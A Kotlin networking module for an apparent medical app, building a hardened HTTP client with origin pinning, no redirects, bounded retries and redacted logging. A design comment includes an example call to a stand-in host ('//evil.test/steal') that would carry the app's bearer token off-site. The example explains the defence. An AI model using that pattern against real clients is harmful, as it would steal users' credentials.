package com.luismejias.lumemedlink.core.networking

import com.luismejias.lumemedlink.shared.AppError
import io.ktor.client.HttpClient
import io.ktor.client.engine.HttpClientEngine
import io.ktor.client.plugins.HttpRequestRetry
import io.ktor.client.plugins.HttpRequestTimeoutException
import io.ktor.client.plugins.HttpResponseValidator
import io.ktor.client.plugins.HttpTimeout
import io.ktor.client.plugins.api.Send
import io.ktor.client.plugins.api.createClientPlugin
import io.ktor.client.plugins.contentnegotiation.ContentNegotiation
import io.ktor.client.plugins.defaultRequest
import io.ktor.client.statement.request
import io.ktor.http.ContentType
import io.ktor.http.HttpHeaders
import io.ktor.http.HttpMethod
import io.ktor.http.URLProtocol
import io.ktor.http.Url
import io.ktor.http.contentType
import io.ktor.serialization.kotlinx.json.json
import kotlinx.coroutines.CancellationException
import kotlinx.io.IOException
import kotlinx.serialization.json.Json
import kotlin.random.Random

/** Scheme + host + port. Requests may only travel to the one this stack was built for. */
private data class Origin(val scheme: String, val host: String, val port: Int)

/** Correlation header, one fresh id per logical request (retries share it on purpose). */
internal const val RID_HEADER: String = "X-Lume-Request-Id"

// Explicit timeouts (ADR-0004): a default is not a decision.
private const val CONNECT_TIMEOUT_MS = 10_000L
private const val REQUEST_TIMEOUT_MS = 30_000L
private const val SOCKET_TIMEOUT_MS = 30_000L

// Bounded retry, GET only — POST/PATCH never retry without idempotency keys, which are an
// app+backend matter (backend trap T13), not something the stack invents.
private const val MAX_RETRIES_GET = 2

// Tolerant contract decoding: an unknown field costs nothing (the lesson the ecosystem board
// records for 0.13.x — string-not-enum fields exist so a future value costs a row, not the page).
private val contractJson = Json { ignoreUnknownKeys = true }

/**
 * The ONE HttpClient factory of this app (ADR-0004, doctrine mirror of LumeNetworking). Every
 * byte of network traffic goes through a client built here; detekt's ForbiddenImport keeps Ktor,
 * OkHttp and HttpURLConnection unreachable outside core/.
 *
 * Hardening, in order: the base URL must be https at CONSTRUCTION (an `http://` base throws here,
 * not at call time); every request is then pinned to that exact ORIGIN — scheme, host and port —
 * not merely to "some https URL"; redirects are never followed; timeouts are explicit; retries are
 * bounded and GET-only; every non-2xx maps to the [AppError] taxonomy via [AppErrorException], and
 * transport failures are mapped too so no engine message escapes with a URL in it.
 *
 * Why the origin check and not a protocol check, learned the hard way (ADR-0016): a protocol check
 * passes `client.get("//evil.test/steal")`. That string reads like a relative path, `defaultRequest`
 * supplies the https scheme, and the request leaves for another host **with this app's bearer token
 * attached** — while the redacted log records only `GET /steal`, so the host never appears anywhere.
 * The generated contract client will hand this stack whole URLs out of `next`/`self` link fields,
 * which is exactly that shape.
 *
 * Note on log volume, stated because the opposite was documented for a while: EVERY attempt of a
 * retried call is logged, not just the final one. That is the more useful behaviour and it is what
 * a test now pins.
 *
 * @param engine injected so production wires [platformHttpEngine] and tests wire MockEngine.
 */
internal fun lumeHttpClient(
    baseUrl: String,
    engine: HttpClientEngine,
    logSink: NetworkLogSink,
    tokenProvider: TokenProvider? = null,
): HttpClient {
    require(baseUrl.startsWith("https://")) {
        "LumeHttpStack is https-only and fails closed: refused to build over '$baseUrl' (ADR-0004)."
    }
    val allowedOrigin = Url(baseUrl).let { Origin(it.protocol.name, it.host, it.port) }
    return HttpClient(engine) {
        followRedirects = false
        expectSuccess = false

        install(HttpTimeout) {
            connectTimeoutMillis = CONNECT_TIMEOUT_MS
            requestTimeoutMillis = REQUEST_TIMEOUT_MS
            socketTimeoutMillis = SOCKET_TIMEOUT_MS
        }

        install(ContentNegotiation) { json(contractJson) }

        install(HttpRequestRetry) {
            maxRetries = MAX_RETRIES_GET
            retryIf { request, response ->
                request.method == HttpMethod.Get && response.status.value in 500..599
            }
            retryOnExceptionIf { request, cause ->
                // The guard maps transport failures to AppError.Retryable(status = null) INSIDE
                // this retry loop, so matching only IOException silently killed bounded retry on
                // transport failure — a feature broken while closing a leak. `status == null` is
                // the discriminator: an HTTP 5xx maps to Retryable WITH a status.
                val mappedTransport = cause is AppErrorException &&
                    cause.error == AppError.Retryable(status = null)
                request.method == HttpMethod.Get && (cause is IOException || mappedTransport)
            }
            exponentialDelay()
        }

        defaultRequest { url(baseUrl) }

        install(lumeStackGuard(allowedOrigin, logSink, tokenProvider))

        HttpResponseValidator {
            validateResponse { response ->
                if (response.status.value !in 200..299) {
                    throw AppErrorException(response.toAppError())
                }
                // A 2xx carrying HTML is not a success — it is an interstitial. Captive portals,
                // hotel and clinic wifi, and proxy error pages all answer 200 with text/html, and
                // this API never does. Rejecting it HERE matters beyond tidiness: left alone, the
                // caller's `body<T>()` throws NoTransformationFoundException from the receive
                // stage, whose message embeds the full URL with its query — outside every net this
                // stack installs, because that exception is raised at the call site.
                if (response.contentType()?.match(ContentType.Text.Html) == true) {
                    throw AppErrorException(AppError.Unexpected(status = response.status.value, problemType = null))
                }
            }
            // The SECOND net, and it exists because the first one was not enough. The guard's Send
            // hook cannot see two real cases: a timeout (HttpTimeout cancels the coroutine, so the
            // exception surfaces outside the send pipeline) and a body that will not transform —
            // a captive portal or proxy error page answering 200 with text/html, which throws
            // NoTransformationFoundException from the RECEIVE stage. Both messages embed the full
            // URL with its query. Anything that is not already ours is replaced here, message and
            // cause chain dropped.
            @Suppress("TooGenericExceptionCaught", "SwallowedException")
            handleResponseExceptionWithRequest { cause, _ ->
                if (cause !is AppErrorException) {
                    throw AppErrorException(AppError.Unexpected(status = null, problemType = null))
                }
            }
        }
    }
}

/**
 * The stack's own guard plugin: per-request origin check, correlation id, bearer attachment, and
 * the redacted log line — method/path/status/rid and NOTHING else (§8.1). EVERY attempt of a
 * retried call is logged, not only the final one; retries share the logical request's rid.
 */
private fun lumeStackGuard(allowedOrigin: Origin, logSink: NetworkLogSink, tokenProvider: TokenProvider?) =
    createClientPlugin("LumeStackGuard") {
        // Transport and timeout failures are mapped HERE, and their original is dropped on the
        // floor — message and cause chain both. Ktor's own message is
        // `Request timeout has expired [url=https://…/patients/11111111-1?rut=11111111-1…]`: the
        // full URL WITH its query, which is precisely what the redacted log line exists to keep
        // out of a crash report or a generic catch (§8.1). Mapping only the HTTP statuses, as this
        // stack did before ADR-0016, left that door open.
        //
        // The catch is deliberately broad: the goal is that NO engine exception escapes carrying a
        // URL, and an exhaustive list of engine exception types is a list that goes stale. Errors
        // still propagate (Exception, not Throwable) and cancellation is re-thrown untouched, since
        // swallowing it would break structured concurrency (§6).
        // SwallowedException is suppressed with its premise inverted: the rule protects you from
        // losing an original exception, and here losing it is the requirement — the original is
        // what carries the URL and its query. Chaining it as `cause` would defeat the whole fix.
        @Suppress("TooGenericExceptionCaught", "SwallowedException")
        on(Send) { request ->
            try {
                proceed(request)
            } catch (timeout: HttpRequestTimeoutException) {
                // BEFORE the CancellationException branch, and that order is the whole fix:
                // HttpRequestTimeoutException IS a CancellationException, so rethrowing
                // cancellation untouched let Ktor's message — which embeds the full URL with its
                // query — reach the caller. This was ADR-0016's own headline case, still open
                // after its fix, because the test that "covered" it threw from the engine instead
                // of letting a real timeout fire.
                throw AppErrorException(AppError.Retryable(status = null))
            } catch (cancellation: CancellationException) {
                throw cancellation
            } catch (alreadyMapped: AppErrorException) {
                throw alreadyMapped
            } catch (transport: Exception) {
                throw AppErrorException(AppError.Retryable(status = null))
            }
        }

        onRequest { request, _ ->
            check(request.url.protocol == URLProtocol.HTTPS) {
                "LumeHttpStack is https-only and fails closed: refused ${request.url.protocol.name}://"
            }
            // The ORIGIN, not just the scheme. The message names no host: an error string is a
            // side channel like any other, and this one would be read by whoever triggered it.
            if (Origin(request.url.protocol.name, request.url.host, request.url.port) != allowedOrigin) {
                // Loud, and in the taxonomy. A silent refusal was worse than it looks: a caller
                // could not tell "the stack blocked this" from a programming error, and nothing
                // recorded that the app had tried to talk somewhere it must not — which is a
                // defect or an attack, never a normal condition. The entry carries no host.
                logSink.log(
                    NetworkLogEntry.of(
                        method = request.method.value,
                        rawPath = request.url.encodedPathSegments.joinToString("/"),
                        status = null,
                        rid = request.headers[RID_HEADER] ?: "-",
                    ),
                )
                throw AppErrorException(AppError.Blocked)
            }
            if (request.headers[RID_HEADER] == null) {
                request.headers.append(RID_HEADER, newRid())
            }
            tokenProvider?.token()?.let { token ->
                request.headers.append(HttpHeaders.Authorization, "Bearer $token")
            }
        }
        onResponse { response ->
            val request = response.request
            if (response.status.value == 401) {
                tokenProvider?.tokenWasRejected()
            }
            logSink.log(
                NetworkLogEntry.of(
                    method = request.method.value,
                    // encodedPath only — the query never reaches a log line — and `of` additionally
                    // redacts identifier-shaped segments, because this app's routes carry the
                    // patient id IN the path (§8.1, ADR-0016).
                    rawPath = request.url.encodedPath,
                    status = response.status.value,
                    rid = request.headers[RID_HEADER] ?: "-",
                ),
            )
        }
    }

// Correlation id, not a secret: plain Random is the point (cheap, per-request), crypto-strength
// randomness buys nothing here.
private fun newRid(): String = buildString(capacity = 32) {
    repeat(16) { append(Random.nextInt(256).toString(16).padStart(2, '0')) }
}
